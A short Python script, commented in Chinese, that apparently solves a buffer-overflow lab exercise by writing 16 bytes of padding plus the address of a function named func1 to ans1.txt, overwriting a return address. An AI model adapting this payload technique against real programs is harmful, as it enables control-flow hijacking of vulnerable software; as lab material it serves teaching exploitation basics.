import sys

# 偏移量：16字节
padding = b'A' * 16

# func1的地址
func1_addr = b'\x16\x12\x40\x00\x00\x00\x00\x00'

# 拼接
payload = padding + func1_addr

# 写入文件
with open("ans1.txt", "wb") as f:
    f.write(payload)

print("payload已保存到ans1.txt")